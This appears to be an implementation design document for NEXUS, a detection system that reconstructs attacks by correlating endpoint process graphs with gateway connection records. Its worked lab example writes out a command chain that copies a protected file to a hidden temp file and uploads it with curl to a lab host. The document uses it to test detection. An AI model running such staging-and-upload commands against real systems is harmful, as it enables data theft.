# NEXUS — Correlation and Attack Reconstruction (implementation-level)

Two correlators, deliberately different in nature:

| | Endpoint correlator (`nexus_endpoint_core`) | Central correlator (`server/correlator`) |
|---|---|---|
| Question | "Which process did what, and which processes are related?" | "Which connection the gateway routed is the one this process opened?" |
| Data structure | In-memory process graph + per-process event lists | Indexed PostgreSQL tables of connections and flows |
| Nature | Deterministic, identity-based | Deterministic, tuple+time-based with explicit uncertainty |
| Output | `Incident` (versioned) | `IncidentCorrelation` rows + `NETWORK_FLOW` relationships |

---

## 1. Process identity (the foundation)

`process_instance_id = "<endpoint_id>:<native_id>"`

| OS | `native_id` | Parent | Fallback |
|---|---|---|---|
| Linux | Tetragon `process.exec_id` (base64 of `nodename:start_ktime:pid`) | `process.parent_exec_id` | kprobe events whose `exec_id` is not in the graph: resolve by `pid` + `start_time` within 10 ms from the adapter's live table; mark `attributes.identity_resolution="pid_start_time"`; edge basis becomes `inferred`. |
| Windows | Sysmon `ProcessGuid` | `ParentProcessGuid` (EID 1) | Events carrying only `ProcessId` (e.g., Security 4663 if enabled): resolve by PID against live table; mark the same way. |

Rules:
- A PID is never used as a key. It is stored for display and for fallback only.
- `process_exit` closes a node (`end_time`); closed nodes are retained for `retention_seconds` (600) so late events (flows, exits of children) still attach.
- Unknown parent → create a **placeholder node** (`binary: "<unknown>"`, `placeholder: true`) and record a `gap` ("parent process not observed; agent started after it").
- Windows, sensor-filtered starts: on the laptop dev profile Sysmon logs EID 1 only for lab-related processes, so EID 3/11/22/26 can name a ProcessGuid that has no node. The adapter creates a placeholder node for it (`binary` from `Image`, `identity_resolution="placeholder"`); the incident gets `PARENT_NOT_OBSERVED`/`IDENTITY_INFERRED` and confidence at most `medium`. A `process_exit` for an unknown `process_instance_id` is ignored.
- Agent start: Tetragon reports pre-existing processes with `flags: procFS`; Sysmon does not. The Windows adapter seeds the graph from `psutil.process_iter()` with `placeholder: true` so parents of later events resolve (basis `inferred`).

## 2. Endpoint graph

```python
@dataclass
class ProcessNode:
    process_instance_id: str
    parent_process_instance_id: str | None
    pid: int
    binary: str
    command_line: str
    user: str | None
    start_time_utc: datetime
    end_time_utc: datetime | None = None
    sha256: str | None = None
    placeholder: bool = False
    children: set[str] = field(default_factory=set)
    file_events: list[str] = field(default_factory=list)      # event_ids
    network_events: list[str] = field(default_factory=list)
    dns_events: list[str] = field(default_factory=list)
    rule_hits: list[str] = field(default_factory=list)        # rule ids already matched on this node

class ProcessGraph:
    nodes: dict[str, ProcessNode]
    events: dict[str, HostEvent]           # bounded LRU; full copies also in SQLite
    live_by_pid: dict[int, str]            # pid -> process_instance_id (current)
    def apply(self, ev: HostEvent) -> ProcessNode   # returns affected node
    def ancestors(self, pid_id, max_depth=5) -> list[ProcessNode]
    def descendants(self, pid_id, max_depth=5, since=None) -> list[ProcessNode]
    def lineage_contains(self, candidate, root, max_depth) -> bool
    def events_for(self, node_ids, types, window) -> list[HostEvent]
    def gc(self)                           # retention + max_nodes
```

Edge semantics (all `observed` unless stated):
- `PARENT_OF(parent → child)` from `process_start.parent_process_instance_id`.
- `ACCESSED_FILE(process → file)` from `file_access`.
- `CONNECTED_TO(process → remote endpoint)` from `network_connect`.
- `RESOLVED(process → domain)` from `dns_query`.
- `NETWORK_FLOW(connection → gateway record)` — added only by the server.

## 3. Rule engine

Rule format: `contracts/rules/RULE-FORMAT.md`. Three kinds:

- **single** — one event matches a predicate (e.g., shell started by an office-like parent).
- **sequence** — N steps, each a predicate over an event type, bound together by **lineage** (`same`, `child_of`, `descendant_of(max_depth)`) and a **window**. Order is optional (`ordered: true|false`).
- **threshold** — count of distinct values of a field (e.g., `dst_port`) over events of one process (or its lineage) within a window ≥ N (port scan).

Evaluation strategy (cheap and adequate for lab event rates, which are tens of events/second):
1. On each applied event, take the affected node and its lineage set `L = ancestors(≤3) ∪ {node} ∪ descendants(≤3)`.
2. For each rule whose `os` includes this OS and whose *last* step's event type equals the new event's type (or any step, if `ordered: false`), attempt a binding: iterate steps, for each step collect candidate events from `events_for(L, step.event_type, rule.window)` satisfying `where` and the lineage constraint relative to already-bound steps. First consistent binding wins (events are few; backtracking depth ≤ 5).
3. `threshold` rules: maintain per-(rule, node) sliding windows of the counted field.
4. Suppress re-firing: a `(rule_id, root_process_instance_id)` pair fires once per `incident_window_seconds`; later matching events are **added as evidence** to the open incident instead (→ new `incident_version`).

Predicate operators (closed set): `equals`, `in`, `prefix_any`, `endswith_any`, `contains_any`, `regex`, `in_cidr`, `not_in_cidr`, `gte`, `lte`. Field paths are the `HostEvent` fields (`binary`, `command_line`, `user`, `file.path`, `file.operation`, `network.dst_ip`, `network.dst_port`, `network.direction`, `dns.query`).

## 4. Incident builder

Input: `RuleMatch{rule, bindings: {step: event_id}, root: process_instance_id}`.

1. **Root** = the highest-ancestor process among bound events, limited to `rule.context.max_ancestors` (default 3) above the earliest bound process. Rationale: the story starts where the suspicious lineage starts (e.g., `python3`), not at `systemd`.
2. **Process set** = root + all bound processes + processes on the paths between them + descendants of bound processes started within the window (default 60 s) — capped at 50 nodes (`gap` if truncated).
3. **Evidence** = bound events (`role: "matched"`) + process_start/exit events of the process set (`role: "context"`) + file/network/dns events of the process set within the window (`role: "context"`), capped at 200 (`gap` if truncated). Each evidence item embeds the full normalized `HostEvent` so the server never needs raw telemetry.
4. **Relationships** from §2 for the process set; each carries `evidence_event_ids` and `basis`.
5. **Connections** = one entry per `network_connect` event in evidence (5-tuple, direction, `first_seen_utc`, `process_instance_id`, `evidence_event_ids`).
6. **technique_ids** = union of `rule.technique_ids` for all matched rules (never guessed per event).
7. **severity** = max over matched rules; **confidence** = `high` if all steps observed with `basis: observed`, `medium` if any `inferred` identity resolution/placeholder is on the path, `low` if a `gap` affects a matched step.
8. **gaps** = structured list (`code`, `message`), e.g., `PARENT_NOT_OBSERVED`, `FILE_READ_NOT_OBSERVABLE_ON_WINDOWS`, `EVIDENCE_TRUNCATED`, `IDENTITY_INFERRED`.
9. **local_response** = `{action, status, dry_run, result_ref}` if the rule declared a response.
10. Serialize → validate against `incident.schema.json` → SQLite → outbox.

Update policy: while the incident is open (`last_evidence + incident_window_seconds > now`), new events for the process set append evidence and bump `incident_version`; the outbox sends the full document again (`PUT`-like semantics via POST upsert). After the window closes, the incident is `closed`; further activity starts a new incident that references the previous one (`related_incident_ids`).

## 5. Central correlator (the algorithm)

### 5.1 Normalization
```python
def key(conn) -> tuple:            # host-reported
    return (conn.protocol, conn.src_ip, conn.src_port, conn.dst_ip, conn.dst_port)

def gw_keys(row) -> set[tuple]:    # conntrack "original" direction = initiator → responder
    k = (row.protocol, row.orig_src_ip, row.orig_src_port, row.orig_dst_ip, row.orig_dst_port)
    r = (row.protocol, row.orig_dst_ip, row.orig_dst_port, row.orig_src_ip, row.orig_src_port)
    return {k, r}
```
Host `direction=outbound` must correspond to gateway original direction; `inbound` to reversed. A direction mismatch is a **negative** signal, not a disqualifier (Windows Sysmon reports accepted connections with `Initiated=false`, which is fine).

### 5.2 Matching
```python
T = settings.MATCH_TOLERANCE_SECONDS      # default 5.0; set from the Week-1 measurement
W = settings.PENDING_RETRY_SECONDS        # default 600

def correlate(incident, conn):
    rows = db.query("""
        SELECT * FROM gateway_connections
        WHERE protocol = :p
          AND ((orig_src_ip=:sip AND orig_src_port=:sp AND orig_dst_ip=:dip AND orig_dst_port=:dp)
            OR (orig_src_ip=:dip AND orig_src_port=:dp AND orig_dst_ip=:sip AND orig_dst_port=:sp))
          AND first_seen_utc BETWEEN :t - :T AND :t + :T
    """, p=conn.protocol, sip=conn.src_ip, sp=conn.src_port, dip=conn.dst_ip, dp=conn.dst_port,
         t=conn.first_seen_utc, T=T)

    scored = []
    for r in rows:
        s = 0.0
        s += 1.0                                                   # tuple match (either direction)
        s += 0.5 if direction_consistent(conn, r) else -0.5
        s += 0.5 if endpoint_owns_ip(incident.endpoint_id, conn.src_ip if conn.direction=="outbound" else conn.dst_ip) else -1.0
        s += max(0.0, 0.5 - abs((r.first_seen_utc - conn.first_seen_utc).total_seconds()) / T)
        scored.append((s, r))

    strong = [(s, r) for s, r in scored if s >= 1.5]
    if len(strong) == 1:
        return Matched(row=strong[0][1], score=strong[0][0])
    if len(strong) > 1:
        return Ambiguous(candidates=strong)         # never pick a winner
    if conn.first_seen_utc > now() - W:
        return Pending()                            # retried on every new registry row
    return Unmatched()
```
Why `score ≥ 1.5`: tuple match (1.0) + at least one of {direction consistent, endpoint owns the IP, close in time}. Port reuse within `T` by the same host is the only realistic way to get two strong candidates in the lab; it is reported as ambiguous and listed, which is the honest answer.

### 5.3 Attaching evidence
On `Matched`:
- Insert `incident_correlations(incident_id, incident_version, connection_id, gateway_connection_id, state, score, matched_at)`.
- Add server-side relationship `NETWORK_FLOW` with `basis: observed`, `evidence: [gateway_connection_id] + flow_ids`.
- Attach every `gateway_flows` row linked to that connection, including `ml` verdicts — **normal flows are attached too**. Flows that arrive later (expiry) trigger `incident.updated`.

On `Ambiguous`: store all candidates; dashboard shows them; an analyst may pin one manually (recorded as `basis: inferred`, `note: "analyst pinned"`).

On `Pending`: a scheduler re-runs `correlate` for pending items whenever `connection_registry` inserts rows, and once a minute; after `W` → `Unmatched` with `gap: NO_GATEWAY_RECORD`.

### 5.4 Reverse direction (network → host)
When `flow_service` writes a flow with `ml.label == "suspicious"`:
1. Look up `incident_connections` by tuple (either direction) within `T` → if found, attach and emit `incident.updated`.
2. Else insert `network_alerts` (standalone). When a later incident matches that tuple, link the alert (`network_alerts.incident_id`).

No global "every flow × every process" join is ever performed.

### 5.5 Flow ↔ connection linking and interface dedupe
`flow_service` sees a cross-subnet connection on both internal interfaces. Linking rule: a flow attaches to the `gateway_connections` row with the same tuple (either direction) whose `[first_seen, last_seen or now]` overlaps the flow's `[first_seen_ms, last_seen_ms]` ± 2 s. Two flows (one per interface) for the same connection are stored with `capture_interface`; features/ML from the **ingress** interface copy (interface of the initiator's subnet) are the ones shown; the other is kept with `duplicate_of`.

### 5.6 Time
- All timestamps UTC ISO-8601 with milliseconds.
- Endpoint heartbeat includes `clock_offset_ms` (half-RTT corrected against the server clock); the correlator applies the offset to incident timestamps if `|offset| > 250 ms` and records it in the correlation row.
- `T` is set from the Week-1 experiment: 50 harmless cross-subnet connections, record `Δ = gateway.first_seen − host.first_seen`; `T = max(2.0, 3 × max|Δ|)`.

## 6. Server tables (PostgreSQL)

```sql
endpoints(endpoint_id PK, os, ip_addresses text[], token_hash, last_heartbeat_utc, clock_offset_ms, agent_version)
incidents(endpoint_id, incident_id, incident_version, document jsonb, status, severity, detected_at_utc, received_at_utc, PRIMARY KEY(endpoint_id, incident_id))
incident_connections(id PK, endpoint_id, incident_id, connection_id, protocol, src_ip inet, src_port int, dst_ip inet, dst_port int, direction, first_seen_utc timestamptz)
gateway_connections(gateway_connection_id PK, protocol, orig_src_ip inet, orig_src_port int, orig_dst_ip inet, orig_dst_port int, first_seen_utc, last_seen_utc, ingress_interface, src_endpoint_id, dst_endpoint_id, packets_orig bigint, bytes_orig bigint, packets_reply bigint, bytes_reply bigint, state)
  INDEX (protocol, orig_src_ip, orig_src_port, orig_dst_ip, orig_dst_port, first_seen_utc)
  INDEX (protocol, orig_dst_ip, orig_dst_port, orig_src_ip, orig_src_port, first_seen_utc)
gateway_flows(flow_id PK, gateway_connection_id FK null, capture_interface, duplicate_of null, protocol, src_ip, src_port, dst_ip, dst_port, first_seen_utc, last_seen_utc, features jsonb, feature_version, ml_label, ml_score, model_version, application_name)
incident_correlations(id PK, endpoint_id, incident_id, incident_version, connection_id, gateway_connection_id null, state, score, candidates jsonb, clock_offset_applied_ms, updated_utc)
network_alerts(alert_id PK, flow_id FK, gateway_connection_id, ml_label, ml_score, created_utc, incident_id null)
ti_indicators(type, value PK(type,value), source, first_seen, tags text[], raw jsonb)
ti_lookups(id PK, indicator_type, value, provider, result jsonb, fetched_utc)
response_commands(command_id PK, target_kind, endpoint_id null, action, params jsonb, requested_by, created_utc, status, dry_run)
response_results(command_id FK, executed_utc, status, detail jsonb)
```

## 7. Worked example (Scenario L1, see 07-DEMO-AND-EVALUATION.md)

1. `python3 /lab/scenarios/l1_stage_and_send.py` → `bash -c "cat /lab/protected/confidential.txt > /tmp/.x"` → `curl -s -X POST --data-binary @/tmp/.x http://192.168.20.10:8443/upload`.
2. Tetragon: exec(python3), exec(bash, parent=python3), kprobe security_file_permission(/lab/protected/confidential.txt, READ) by `cat` (child of bash), exec(curl, parent=bash), tcp_connect 192.168.10.10:51542 → 192.168.20.10:8443.
3. Rule `NX-LIN-001` (sequence: interpreter → shell descendant → protected read in lineage → outbound connect in lineage, window 60 s) binds; incident `linux-vm-01:INC-2026…-0001` v1, root = python3, processes {python3, bash, cat, curl}, connections [51542→8443], techniques [T1059.004, T1005, T1041].
4. Gateway: conntrack NEW at SYN → `gateway_connections` row (ingress `ens-lin`); POST incident arrives ~1 s later; correlator finds one row, direction consistent, `linux-vm-01` owns 192.168.10.10, Δt=12 ms → score 2.5 → `matched`.
5. 15 s after the upload finishes, NFStream expires the flow → features → RF says `benign` (0.07) → attached anyway; dashboard shows "matched to gateway flow; IDS verdict: benign" — proving correlation does not depend on the IDS.
6. TI: SHA-256 of `/lab/scenarios/l1_stage_and_send.py` is unknown; dst `192.168.20.10` carries the `lab-test` tag from the local indicator table → enrichment panel populated.
